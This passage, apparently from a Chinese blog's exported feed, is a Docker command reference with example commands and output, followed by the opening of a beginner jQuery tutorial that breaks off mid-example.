开放一个端口或一组端口； --volume , -v: 绑定一个卷实例使用docker镜像nginx:latest以后台模式启动一个容器,并将容器命名为mynginx。docker run --name mynginx -d nginx:latest使用镜像nginx:latest以后台模式启动一个容器,并将容器的80端口映射到主机随机端口。docker run -P -d nginx:latest使用镜像 nginx:latest，以后台模式启动一个容器,将容器的 80 端口映射到主机的 80 端口,主机的目录 /data 映射到容器的 /data。docker run -p 80:80 -v /data:/data -d nginx:latest绑定容器的 8080 端口，并将其映射到本地主机 127.0.0.1 的 80 端口上。$ docker run -p 127.0.0.1:80:8080/tcp ubuntu bash使用镜像nginx:latest以交互模式启动一个容器,在容器内执行/bin/bash命令。runoob@runoob:~$ docker run -it nginx:latest /bin/bashroot@b8573233d675:/#start/stop/restart1234567891011121314151617181920212223242526docker start :启动一个或多个已经被停止的容器docker stop :停止一个运行中的容器docker restart :重启容器语法docker start [OPTIONS] CONTAINER [CONTAINER...]docker stop [OPTIONS] CONTAINER [CONTAINER...]docker restart [OPTIONS] CONTAINER [CONTAINER...]实例启动已被停止的容器myrunoobdocker start myrunoob停止运行中的容器myrunoobdocker stop myrunoob重启容器myrunoobdocker restart myrunoobkill123456789101112131415docker kill :杀掉一个运行中的容器。语法docker kill [OPTIONS] CONTAINER [CONTAINER...]OPTIONS说明： -s :向容器发送一个信号实例杀掉运行中的容器mynginxrunoob@runoob:~$ docker kill -s KILL mynginxmynginxrm1234567891011121314151617181920212223242526docker rm ：删除一个或多少容器语法docker rm [OPTIONS] CONTAINER [CONTAINER...]OPTIONS说明： -f :通过SIGKILL信号强制删除一个运行中的容器 -l :移除容器间的网络连接，而非容器本身 -v :-v 删除与容器关联的卷实例强制删除容器db01、db02docker rm -f db01 db02移除容器nginx01对容器db01的连接，连接名dbdocker rm -l db 删除容器nginx01,并删除容器挂载的数据卷docker rm -v nginx01pause/unpause123456789101112131415161718docker pause :暂停容器中所有的进程。docker unpause :恢复容器中所有的进程。语法docker pause [OPTIONS] CONTAINER [CONTAINER...]docker unpause [OPTIONS] CONTAINER [CONTAINER...]实例暂停数据库容器db01提供服务。docker pause db01恢复数据库容器db01提供服务。docker unpause db01create1234567891011121314docker create ：创建一个新的容器但不启动它用法同 docker run语法docker create [OPTIONS] IMAGE [COMMAND] [ARG...]语法同 docker run实例使用docker镜像nginx:latest创建一个容器,并将容器命名为myrunoobrunoob@runoob:~$ docker create --name myrunoob nginx:latest 09b93464c2f75b7b69f83d56a9cfc23ceb50a48a9db7652ee4c27e3e2cb1961fexec123456789101112131415161718192021222324252627282930313233343536373839docker exec ：在运行的容器中执行命令语法docker exec [OPTIONS] CONTAINER COMMAND [ARG...]OPTIONS说明： -d :分离模式: 在后台运行 -i :即使没有附加也保持STDIN 打开 -t :分配一个伪终端实例在容器 mynginx 中以交互模式执行容器内 /root/runoob.sh 脚本:runoob@runoob:~$ docker exec -it mynginx /bin/sh /root/runoob.shhttp://www.runoob.com/在容器 mynginx 中开启一个交互模式的终端:runoob@runoob:~$ docker exec -i -t mynginx /bin/bashroot@b1a0703e41e7:/#也可以通过 docker ps -a 命令查看已经在运行的容器，然后使用容器 ID 进入容器。查看已经在运行的容器 ID：# docker ps -a ...9df70f9a0714 openjdk &quot;/usercode/script.sh…&quot; ...第一列的 9df70f9a0714 就是容器 ID。通过 exec 命令对指定的容器执行 bash:# docker exec -it 9df70f9a0714 /bin/bash容器操作ps123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687docker ps : 列出容器语法docker ps [OPTIONS]OPTIONS说明： -a :显示所有的容器，包括未运行的。 -f :根据条件过滤显示的内容。 --format :指定返回值的模板文件。 -l :显示最近创建的容器。 -n :列出最近创建的n个容器。 --no-trunc :不截断输出。 -q :静默模式，只显示容器编号。 -s :显示总的文件大小。实例列出所有在运行的容器信息。runoob@runoob:~$ docker psCONTAINER ID IMAGE COMMAND ... PORTS NAMES09b93464c2f7 nginx:latest &quot;nginx -g &apos;daemon off&quot; ... 80/tcp, 443/tcp myrunoob96f7f14e99ab mysql:5.6 &quot;docker-entrypoint.sh&quot; ... 0.0.0.0:3306-&gt;3306/tcp mymysql列出最近创建的5个容器信息。runoob@runoob:~$ docker ps -n 5CONTAINER ID IMAGE COMMAND CREATED 09b93464c2f7 nginx:latest &quot;nginx -g &apos;daemon off&quot; 2 days ago ... b8573233d675 nginx:latest &quot;/bin/bash&quot; 2 days ago ... b1a0703e41e7 nginx:latest &quot;nginx -g &apos;daemon off&quot; 2 days ago ... f46fb1dec520 5c6e1090e771 &quot;/bin/sh -c &apos;set -x \t&quot; 2 days ago ... a63b4a5597de 860c279d2fec &quot;bash&quot; 2 days ago ...列出所有创建的容器ID。runoob@runoob:~$ docker ps -a -q09b93464c2f7b8573233d675b1a0703e41e7f46fb1dec520a63b4a5597de6a4aa42e947bde7bb36e796843a432b73776664a8ab1a585ba52eb632bbd...根据条件过滤显示的内容根据标签过滤$ docker run -d --name=test-nginx --label color=blue nginx$ docker ps --filter &quot;label=color&quot;$ docker ps --filter &quot;label=color=blue&quot;根据名称过滤$ docker ps --filter&quot;name=test-nginx&quot;根据状态过滤$ docker ps -a --filter &apos;exited=0&apos;$ docker ps --filter status=running$ docker ps --filter status=paused根据镜像过滤#镜像名称$ docker ps --filter ancestor=nginx#镜像ID$ docker ps --filter ancestor=d0e008c6cf02根据启动顺序过滤$ docker ps -f before=9c3527ed70ce$ docker ps -f since=6e63f6ff38b0inspect123456789101112131415161718192021222324252627282930313233343536373839404142434445docker inspect : 获取容器/镜像的元数据。语法docker inspect [OPTIONS] NAME|ID [NAME|ID...]OPTIONS说明： -f :指定返回值的模板文件。 -s :显示总的文件大小。 --type :为指定类型返回JSON。实例获取镜像mysql:5.6的元信息。runoob@runoob:~$ docker inspect mysql:5.6[ &#123; &quot;Id&quot;: &quot;sha256:2c0964ec182ae9a045f866bbc2553087f6e42bfc16074a74fb820af235f070ec&quot;, &quot;RepoTags&quot;: [ &quot;mysql:5.6&quot; ], &quot;RepoDigests&quot;: [], &quot;Parent&quot;: &quot;&quot;, &quot;Comment&quot;: &quot;&quot;, &quot;Created&quot;: &quot;2016-05-24T04:01:41.168371815Z&quot;, &quot;Container&quot;: &quot;e0924bc460ff97787f34610115e9363e6363b30b8efa406e28eb495ab199ca54&quot;, &quot;ContainerConfig&quot;: &#123; &quot;Hostname&quot;: &quot;b0cf605c7757&quot;, &quot;Domainname&quot;: &quot;&quot;, &quot;User&quot;: &quot;&quot;, &quot;AttachStdin&quot;: false, &quot;AttachStdout&quot;: false, &quot;AttachStderr&quot;: false, &quot;ExposedPorts&quot;: &#123; &quot;3306/tcp&quot;: &#123;&#125; &#125;,...获取正在运行的容器mymysql的 IP。runoob@runoob:~$ docker inspect --format=&apos;&#123;&#123;range .NetworkSettings.Networks&#125;&#125;&#123;&#123;.IPAddress&#125;&#125;&#123;&#123;end&#125;&#125;&apos; mymysql172.17.0.3top1234567891011121314151617docker top :查看容器中运行的进程信息，支持 ps 命令参数。语法docker top [OPTIONS] CONTAINER [ps OPTIONS]容器运行时不一定有/bin/bash终端来交互执行top命令，而且容器还不一定有top命令，可以使用docker top来实现查看container中正在运行的进程。实例查看容器mymysql的进程信息。runoob@runoob:~/mysql$ docker top mymysqlUID PID PPID C STIME TTY TIME CMD999 40347 40331 18 00:58 ? 00:00:02 mysqld查看所有运行容器的进程信息。for i in `docker ps |grep Up|awk &apos;&#123;print $1&#125;&apos;`;do echo \ &amp;&amp;docker top $i; doneattach1234567891011121314docker attach :连接到正在运行中的容器。语法docker attach [OPTIONS] CONTAINER要attach上去的容器必须正在运行，可以同时连接上同一个container来共享屏幕（与screen命令的attach类似）。官方文档中说attach后可以通过CTRL-C来detach，但实际上经过我的测试，如果container当前在运行bash，CTRL-C自然是当前行的输入，没有退出；如果container当前正在前台运行进程，如输出nginx的access.log日志，CTRL-C不仅会导致退出容器，而且还stop了。这不是我们想要的，detach的意思按理应该是脱离容器终端，但容器依然运行。好在attach是可以带上--sig-proxy=false来确保CTRL-D或CTRL-C不会关闭容器。实例容器mynginx将访问日志指到标准输出，连接到容器查看访问信息。runoob@runoob:~$ docker attach --sig-proxy=false mynginx192.168.239.1 - - [10/Jul/2016:16:54:26 +0000] &quot;GET / HTTP/1.1&quot; 304 0 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36&quot; &quot;-&quot;events123456789101112131415161718192021222324252627282930313233343536373839404142docker events : 从服务器获取实时事件语法docker events [OPTIONS]OPTIONS说明： -f ：根据条件过滤事件； --since ：从指定的时间戳后显示所有事件; --until ：流水时间显示到指定的时间为止；实例显示docker 2016年7月1日后的所有事件。runoob@runoob:~/mysql$ docker events --since=&quot;1467302400&quot;2016-07-08T19:44:54.501277677+08:00 network connect 66f958fd13dc4314ad20034e576d5c5eba72e0849dcc38ad9e8436314a4149d4 (container=b8573233d675705df8c89796a2c2687cd8e36e03646457a15fb51022db440e64, name=bridge, type=bridge)2016-07-08T19:44:54.723876221+08:00 container start b8573233d675705df8c89796a2c2687cd8e36e03646457a15fb51022db440e64 (image=nginx:latest, name=elegant_albattani)2016-07-08T19:44:54.726110498+08:00 container resize b8573233d675705df8c89796a2c2687cd8e36e03646457a15fb51022db440e64 (height=39, image=nginx:latest, name=elegant_albattani, width=167)2016-07-08T19:46:22.137250899+08:00 container die b8573233d675705df8c89796a2c2687cd8e36e03646457a15fb51022db440e64 (exitCode=0, image=nginx:latest, name=elegant_albattani)...显示docker 镜像为mysql:5.6 2016年7月1日后的相关事件。runoob@runoob:~/mysql$ docker events -f &quot;image&quot;=&quot;mysql:5.6&quot; --since=&quot;1467302400&quot; 2016-07-11T00:38:53.975174837+08:00 container start 96f7f14e99ab9d2f60943a50be23035eda1623782cc5f930411bbea407a2bb10 (image=mysql:5.6, name=mymysql)2016-07-11T00:51:17.022572452+08:00 container kill 96f7f14e99ab9d2f60943a50be23035eda1623782cc5f930411bbea407a2bb10 (image=mysql:5.6, name=mymysql, signal=9)2016-07-11T00:51:17.132532080+08:00 container die 96f7f14e99ab9d2f60943a50be23035eda1623782cc5f930411bbea407a2bb10 (exitCode=137, image=mysql:5.6, name=mymysql)2016-07-11T00:51:17.514661357+08:00 container destroy 96f7f14e99ab9d2f60943a50be23035eda1623782cc5f930411bbea407a2bb10 (image=mysql:5.6, name=mymysql)2016-07-11T00:57:18.551984549+08:00 container create c8f0a32f12f5ec061d286af0b1285601a3e33a90a08ff1706de619ac823c345c (image=mysql:5.6, name=mymysql)2016-07-11T00:57:18.557405864+08:00 container attach c8f0a32f12f5ec061d286af0b1285601a3e33a90a08ff1706de619ac823c345c (image=mysql:5.6, name=mymysql)2016-07-11T00:57:18.844134112+08:00 container start c8f0a32f12f5ec061d286af0b1285601a3e33a90a08ff1706de619ac823c345c (image=mysql:5.6, name=mymysql)2016-07-11T00:57:19.140141428+08:00 container die c8f0a32f12f5ec061d286af0b1285601a3e33a90a08ff1706de619ac823c345c (exitCode=1, image=mysql:5.6, name=mymysql)2016-07-11T00:58:05.941019136+08:00 container destroy c8f0a32f12f5ec061d286af0b1285601a3e33a90a08ff1706de619ac823c345c (image=mysql:5.6, name=mymysql)2016-07-11T00:58:07.965128417+08:00 container create a404c6c174a21c52f199cfce476e041074ab020453c7df2a13a7869b48f2f37e (image=mysql:5.6, name=mymysql)2016-07-11T00:58:08.188734598+08:00 container start a404c6c174a21c52f199cfce476e041074ab020453c7df2a13a7869b48f2f37e (image=mysql:5.6, name=mymysql)2016-07-11T00:58:20.010876777+08:00 container top a404c6c174a21c52f199cfce476e041074ab020453c7df2a13a7869b48f2f37e (image=mysql:5.6, name=mymysql)2016-07-11T01:06:01.395365098+08:00 container top a404c6c174a21c52f199cfce476e041074ab020453c7df2a13a7869b48f2f37e (image=mysql:5.6, name=mymysql)如果指定的时间是到秒级的，需要将时间转成时间戳。如果时间为日期的话，可以直接使用，如--since=&quot;2016-07-01&quot;。logs1234567891011121314151617181920212223242526272829docker logs : 获取容器的日志语法docker logs [OPTIONS] CONTAINEROPTIONS说明： -f : 跟踪日志输出 --since :显示某个开始时间的所有日志 -t : 显示时间戳 --tail :仅列出最新N条容器日志实例跟踪查看容器mynginx的日志输出。runoob@runoob:~$ docker logs -f mynginx192.168.239.1 - - [10/Jul/2016:16:53:33 +0000] &quot;GET / HTTP/1.1&quot; 200 612 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36&quot; &quot;-&quot;2016/07/10 16:53:33 [error] 5#5: *1 open() &quot;/usr/share/nginx/html/favicon.ico&quot; failed (2: No such file or directory), client: 192.168.239.1, server: localhost, request: &quot;GET /favicon.ico HTTP/1.1&quot;, host: &quot;192.168.239.130&quot;, referrer: &quot;http://192.168.239.130/&quot;192.168.239.1 - - [10/Jul/2016:16:53:33 +0000] &quot;GET /favicon.ico HTTP/1.1&quot; 404 571 &quot;http://192.168.239.130/&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36&quot; &quot;-&quot;192.168.239.1 - - [10/Jul/2016:16:53:59 +0000] &quot;GET / HTTP/1.1&quot; 304 0 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36&quot; &quot;-&quot;...查看容器mynginx从2016年7月1日后的最新10条日志。docker logs --since=&quot;2016-07-01&quot; --tail=10 mynginxwait12345678docker wait : 阻塞运行直到容器停止，然后打印出它的退出代码。语法docker wait [OPTIONS] CONTAINER [CONTAINER...]实例docker wait CONTAINERexport12345678910111213141516docker export :将文件系统作为一个tar归档文件导出到STDOUT。语法docker export [OPTIONS] CONTAINEROPTIONS说明： -o :将输入内容写到文件。实例将id为a404c6c174a2的容器按日期保存为tar文件。runoob@runoob:~$ docker export -o mysql-`date +%Y%m%d`.tar a404c6c174a2runoob@runoob:~$ ls mysql-`date +%Y%m%d`.tarmysql-20160711.tarport1234567891011docker port :列出指定的容器的端口映射，或者查找将PRIVATE_PORT NAT到面向公众的端口。语法docker port [OPTIONS] CONTAINER [PRIVATE_PORT[/PROTO]]实例查看容器mynginx的端口映射情况。runoob@runoob:~$ docker port mymysql3306/tcp -&gt; 0.0.0.0:3306容器rootfs命令commit123456789101112131415161718192021222324docker commit :从容器创建一个新的镜像。语法docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]]OPTIONS说明： -a :提交的镜像作者； -c :使用Dockerfile指令来创建镜像； -m :提交时的说明文字； -p :在commit时，将容器暂停。实例将容器a404c6c174a2 保存为新的镜像,并添加提交人信息和说明信息。runoob@runoob:~$ docker commit -a &quot;runoob.com&quot; -m &quot;my apache&quot; a404c6c174a2 mymysql:v1 sha256:37af1236adef1544e8886be23010b66577647a40bc02c0885a6600b33ee28057runoob@runoob:~$ docker images mymysql:v1REPOSITORY TAG IMAGE ID CREATED SIZEmymysql v1 37af1236adef 15 seconds ago 329 MBcp123456789101112131415161718192021222324docker cp :用于容器与主机之间的数据拷贝。语法docker cp [OPTIONS] CONTAINER:SRC_PATH DEST_PATH|-docker cp [OPTIONS] SRC_PATH|- CONTAINER:DEST_PATHOPTIONS说明： -L :保持源目标中的链接实例将主机/www/runoob目录拷贝到容器96f7f14e99ab的/www目录下。docker cp /www/runoob 96f7f14e99ab:/www/将主机/www/runoob目录拷贝到容器96f7f14e99ab中，目录重命名为www。docker cp /www/runoob 96f7f14e99ab:/www将容器96f7f14e99ab的/www目录拷贝到主机的/tmp目录中。docker cp 96f7f14e99ab:/www /tmp/diff1234567891011121314151617docker diff : 检查容器里文件结构的更改。语法docker diff [OPTIONS] CONTAINER实例查看容器mymysql的文件结构更改。runoob@runoob:~$ docker diff mymysqlA /logsA /mysql_dataC /runC /run/mysqldA /run/mysqld/mysqld.pidA /run/mysqld/mysqld.sockC /tmp镜像仓库login123456789101112131415161718192021222324docker login : 登陆到一个Docker镜像仓库，如果未指定镜像仓库地址，默认为官方仓库 Docker Hubdocker logout : 登出一个Docker镜像仓库，如果未指定镜像仓库地址，默认为官方仓库 Docker Hub语法docker login [OPTIONS] [SERVER]docker logout [OPTIONS] [SERVER]OPTIONS说明： -u :登陆的用户名 -p :登陆的密码实例登陆到Docker Hubdocker login -u 用户名 -p 密码登出Docker Hubdocker logoutpull1234567891011121314151617181920docker pull : 从镜像仓库中拉取或者更新指定镜像语法docker pull [OPTIONS] NAME[:TAG|@DIGEST]OPTIONS说明： -a :拉取所有 tagged 镜像 --disable-content-trust :忽略镜像的校验,默认开启实例从Docker Hub下载java最新版镜像。docker pull java从Docker Hub下载REPOSITORY为java的所有镜像。docker pull -a javapush1234567891011121314docker push : 将本地的镜像上传到镜像仓库,要先登陆到镜像仓库语法docker push [OPTIONS] NAME[:TAG]OPTIONS说明： --disable-content-trust :忽略镜像的校验,默认开启实例上传本地镜像myapache:v1到镜像仓库中。docker push myapache:v1search12345678910111213141516171819202122232425docker search : 从Docker Hub查找镜像语法docker search [OPTIONS] TERMOPTIONS说明： --automated :只列出 automated build类型的镜像； --no-trunc :显示完整的镜像描述； -s :列出收藏数不小于指定值的镜像。实例从Docker Hub查找所有镜像名包含java，并且收藏数大于10的镜像runoob@runoob:~$ docker search -s 10 javaNAME DESCRIPTION STARS OFFICIAL AUTOMATEDjava Java is a concurrent, class-based... 1037 [OK] anapsix/alpine-java Oracle Java 8 (and 7) with GLIBC ... 115 [OK]develar/java 46 [OK]isuper/java-oracle This repository contains all java... 38 [OK]lwieske/java-8 Oracle Java 8 Container - Full + ... 27 [OK]nimmis/java-centos This is docker images of CentOS 7... 13 [OK]本地镜像管理images123456789101112131415161718192021222324252627282930313233343536373839404142docker images : 列出本地镜像。语法docker images [OPTIONS] [REPOSITORY[:TAG]]OPTIONS说明： -a :列出本地所有的镜像（含中间映像层，默认情况下，过滤掉中间映像层）； --digests :显示镜像的摘要信息； -f :显示满足条件的镜像； --format :指定返回值的模板文件； --no-trunc :显示完整的镜像信息； -q :只显示镜像ID。实例查看本地镜像列表。runoob@runoob:~$ docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEmymysql v1 37af1236adef 5 minutes ago 329 MBrunoob/ubuntu v4 1c06aa18edee 2 days ago 142.1 MB&lt;none&gt; &lt;none&gt; 5c6e1090e771 2 days ago 165.9 MBhttpd latest ed38aaffef30 11 days ago 195.1 MBalpine latest 4e38e38c8ce0 2 weeks ago 4.799 MBmongo 3.2 282fd552add6 3 weeks ago 336.1 MBredis latest 4465e4bcad80 3 weeks ago 185.7 MBphp 5.6-fpm 025041cd3aa5 3 weeks ago 456.3 MBpython 3.5 045767ddf24a 3 weeks ago 684.1 MB...列出本地镜像中REPOSITORY为ubuntu的镜像列表。root@runoob:~# docker images ubuntuREPOSITORY TAG IMAGE ID CREATED SIZEubuntu 14.04 90d5884b1ee0 9 weeks ago 188 MBubuntu 15.10 4e3b13c8a266 3 months ago 136.3 MBrmi12345678910111213141516171819202122232425262728293031323334353637383940414243444546docker rmi : 删除本地一个或多少镜像。语法docker rmi [OPTIONS] IMAGE [IMAGE...]OPTIONS说明： -f :强制删除； --no-prune :不移除该镜像的过程镜像，默认移除；实例强制删除本地镜像 runoob/ubuntu:v4。root@runoob:~# docker rmi -f runoob/ubuntu:v4Untagged: runoob/ubuntu:v4Deleted: sha256:1c06aa18edee44230f93a90a7d88139235de12cd4c089d41eed8419b503072beDeleted: sha256:85feb446e89a28d58ee7d80ea5ce367eebb7cec70f0ec18aa4faa874cbd97c73prune 命令用来删除不再使用的 docker 对象。删除所有未被 tag 标记和未被容器使用的镜像:$ docker image pruneWARNING! This will remove all dangling images.Are you sure you want to continue? [y/N] y删除所有未被容器使用的镜像:$ docker image prune -a删除所有停止运行的容器:$ docker container prune删除所有未被挂载的卷:$ docker volume prune删除所有网络:$ docker network prune删除 docker 所有资源:$ docker system prunetag12345678910111213docker tag : 标记本地镜像，将其归入某一仓库。语法docker tag [OPTIONS] IMAGE[:TAG] [REGISTRYHOST/][USERNAME/]NAME[:TAG]实例将镜像ubuntu:15.10标记为 runoob/ubuntu:v3 镜像。root@runoob:~# docker tag ubuntu:15.10 runoob/ubuntu:v3root@runoob:~# docker images runoob/ubuntu:v3REPOSITORY TAG IMAGE ID CREATED SIZErunoob/ubuntu v3 4e3b13c8a266 3 months ago 136.3 MBbuild1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768docker build 命令用于使用 Dockerfile 创建镜像。语法docker build [OPTIONS] PATH | URL | -OPTIONS说明： --build-arg=[] :设置镜像创建时的变量； --cpu-shares :设置 cpu 使用权重； --cpu-period :限制 CPU CFS周期； --cpu-quota :限制 CPU CFS配额； --cpuset-cpus :指定使用的CPU id； --cpuset-mems :指定使用的内存 id； --disable-content-trust :忽略校验，默认开启； -f :指定要使用的Dockerfile路径； --force-rm :设置镜像过程中删除中间容器； --isolation :使用容器隔离技术； --label=[] :设置镜像使用的元数据； -m :设置内存最大值； --memory-swap :设置Swap的最大值为内存+swap，&quot;-1&quot;表示不限swap； --no-cache :创建镜像的过程不使用缓存； --pull :尝试去更新镜像的新版本； --quiet, -q :安静模式，成功后只输出镜像 ID； --rm :设置镜像成功后删除中间容器； --shm-size :设置/dev/shm的大小，默认值是64M； --ulimit :Ulimit配置。 --tag, -t: 镜像的名字及标签，通常 name:tag 或者 name 格式；可以在一次构建中为一个镜像设置多个标签。 --network: 默认 default。在构建期间设置RUN指令的网络模式实例使用当前目录的 Dockerfile 创建镜像，标签为 runoob/ubuntu:v1。docker build -t runoob/ubuntu:v1 . 使用URL github.com/creack/docker-firefox 的 Dockerfile 创建镜像。docker build github.com/creack/docker-firefox也可以通过 -f Dockerfile 文件的位置：$ docker build -f /path/to/a/Dockerfile .在 Docker 守护进程执行 Dockerfile 中的指令前，首先会对 Dockerfile 进行语法检查，有语法错误时会返回：$ docker build -t test/myapp .Sending build context to Docker daemon 2.048 kBError response from daemon: Unknown instruction: RUNCMDhistory1234567891011121314151617181920212223docker history : 查看指定镜像的创建历史。语法docker history [OPTIONS] IMAGEOPTIONS说明： -H :以可读的格式打印镜像大小和日期，默认为true； --no-trunc :显示完整的提交记录； -q :仅列出提交记录ID。实例查看本地镜像runoob/ubuntu:v3的创建历史。root@runoob:~# docker history runoob/ubuntu:v3IMAGE CREATED CREATED BY SIZE COMMENT4e3b13c8a266 3 months ago /bin/sh -c #(nop) CMD [&quot;/bin/bash&quot;] 0 B &lt;missing&gt; 3 months ago /bin/sh -c sed -i &apos;s/^#\s*\(deb.*universe\)$/ 1.863 kB &lt;missing&gt; 3 months ago /bin/sh -c set -xe &amp;&amp; echo &apos;#!/bin/sh&apos; &gt; /u 701 B &lt;missing&gt; 3 months ago /bin/sh -c #(nop) ADD file:43cb048516c6b80f22 136.3 MBsave12345678910111213141516171819202122232425262728293031323334docker save : 将指定镜像保存成 tar 归档文件。语法docker save [OPTIONS] IMAGE [IMAGE...]OPTIONS 说明： -o :输出到的文件。实例将镜像 runoob/ubuntu:v3 生成 my_ubuntu_v3.tar 文档runoob@runoob:~$ docker save -o my_ubuntu_v3.tar runoob/ubuntu:v3runoob@runoob:~$ ll my_ubuntu_v3.tar-rw------- 1 runoob runoob 142102016 Jul 11 01:37 my_ubuntu_v3.tadocker 容器导入导出有两种方法：一种是使用 save 和 load 命令使用例子如下：docker save ubuntu:load&gt;/root/ubuntu.tardocker load&lt;ubuntu.tar一种是使用 export 和 import 命令使用例子如下：docker export 98ca36&gt; ubuntu.tarcat ubuntu.tar | sudo docker import - ubuntu:import需要注意两种方法不可混用。load1234567891011121314151617docker load : 导入使用 docker save 命令导出的镜像。语法docker load [OPTIONS]OPTIONS 说明： -i :指定导出的文件。 -q :精简输出信息。实例导入镜像：docker load -i ubuntu.tardocker load &lt; ubuntu.tarimport1234567891011121314151617181920docker import : 从归档文件中创建镜像。语法docker import [OPTIONS] file|URL|- [REPOSITORY[:TAG]]OPTIONS说明： -c :应用docker 指令创建镜像； -m :提交时的说明文字；实例从镜像归档文件my_ubuntu_v3.tar创建镜像，命名为runoob/ubuntu:v4runoob@runoob:~$ docker import my_ubuntu_v3.tar runoob/ubuntu:v4 sha256:63ce4a6d6bc3fabb95dbd6c561404a309b7bdfc4e21c1d59fe9fe4299cbfea39runoob@runoob:~$ docker images runoob/ubuntu:v4REPOSITORY TAG IMAGE ID CREATED SIZErunoob/ubuntu v4 63ce4a6d6bc3 20 seconds ago 142.1 MBinfo|versioninfo12345678910111213141516171819202122232425docker info : 显示 Docker 系统信息，包括镜像和容器数。。语法docker info [OPTIONS]实例查看docker系统信息。$ docker infoContainers: 12Images: 41Storage Driver: aufs Root Dir: /var/lib/docker/aufs Backing Filesystem: extfs Dirs: 66 Dirperm1 Supported: falseExecution Driver: native-0.2Logging Driver: json-fileKernel Version: 3.13.0-32-genericOperating System: Ubuntu 14.04.1 LTSCPUs: 1Total Memory: 1.954 GiBName: iZ23mtq8bs1ZID: M5N4:K6WN:PUNC:73ZN:AONJ:AUHL:KSYH:2JPI:CH3K:O4MK:6OCX:5OYWversion1234567891011121314151617181920212223242526272829docker version :显示 Docker 版本信息。语法docker version [OPTIONS]OPTIONS说明： -f :指定返回值的模板文件。实例显示 Docker 版本信息。$ docker versionClient: Version: 1.8.2 API version: 1.20 Go version: go1.4.2 Git commit: 0a8c2e3 Built: Thu Sep 10 19:19:00 UTC 2015 OS/Arch: linux/amd64Server: Version: 1.8.2 API version: 1.20 Go version: go1.4.2 Git commit: 0a8c2e3 Built: Thu Sep 10 19:19:00 UTC 2015 OS/Arch: linux/amd64Docker 资源汇总Docker官方英文资源docker官网：http://www.docker.comDocker Windows 入门：https://docs.docker.com/docker-for-windows/Docker CE(社区版) Ubuntu：https://docs.docker.com/install/linux/docker-ce/ubuntu/Docker mac 入门：https://docs.docker.com/docker-for-mac/Docker 用户指引：https://docs.docker.com/config/daemon/Docker 官方博客：http://blog.docker.com/Docker Hub: https://hub.docker.com/Docker开源： https://www.docker.com/open-sourceDocker中文资源Docker中文网站：https://www.docker-cn.com/Docker安装手册：https://docs.docker-cn.com/engine/installation/Docker 国内镜像阿里云的加速器：https://help.aliyun.com/document_detail/60750.html网易加速器：http://hub-mirror.c.163.com官方中国加速器：https://registry.docker-cn.comustc的镜像：https://docker.mirrors.ustc.edu.cndaocloud：https://www.daocloud.io/mirror#accelerator-doc（注册后使用）]]></content>
      <categories>
        <category>CentOS</category>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>CentOS</tag>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从0玩转jQuery]]></title>
    <url>%2F2019%2F07%2F10%2F%E4%BB%8E0%E7%8E%A9%E8%BD%ACjQuery%2F</url>
    <content type="text"><![CDATA[一、初识jQuery课前须知: 学习jQuery前必须先掌握JavaScriptjQuery虽然属于前端技术, 但是对于后端人员(诸如Java、PHP等,也需要掌握)1. jQuery是什么？jQuery是一款优秀的JavaScript库，从命名可以看出jQuery最主要的用途是用来做查询（jQuery=js+Query）.在jQuery官方Logo下方还有一个副标题（write less, do more）, 体现了jQuery除了查询以外,还能让我们对HTML文档遍历和操作、事件处理、动画以及Ajax变得更加简单体验jQuery原生JS设置背景（先不要求看懂代码，先看看谁更爽）12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;01-初识jQuery&lt;/title&gt; &lt;script type="text/javascript"&gt; window.onload = function (ev) &#123; // 查询 var div = document.getElementsByClassName("box01"); // 操作css div[0].style.backgroundColor = "red"; &#125;; &lt;/script&gt; &lt;style type="text/css"&gt; div &#123; width: 100px; height: 100px; border: 1px solid #000000; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="box01"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;使用jQuery设置背景123456789101112131415161718192021222324&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;01-初识jQuery&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(document).ready(function () &#123; // 查询，操作CSS一步到位 $("div").eq(0).css('background', 'yellow'); &#125;); &lt;/script&gt; &lt;style type="text/css"&gt; div &#123; width: 100px; height: 100px; border: 1px solid #000000; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="box01"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;2. 为什么要使用jQuery？强大的选择器: 方便快速查找DOM元素如上面实例所展示一样，通过jQuery查找DOM元素要比原生js快捷很多jQuery允许开发者使用CSS1-CSS3几乎所有的选择器,以及jQuery独创的选择器支持链式调用: 可以通过.不断调用jQuery对象的方法如上面实例所展示一样，jQuery可以通过.（点）.不断调用jQuery对象的方法，而原生JavaScript则不一定12345678910111213141516171819202122232425262728293031&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;01-初识jQuery&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; // 1.原生JavaScript var div = document.getElementsByTagName("div"); // 报错,必须分开写 div[0].style.backgroundColor = "red".width = 200 + "px"; // div[0].style.width = 200+"px"; // 2.jQuery $(document).ready(function () &#123; // 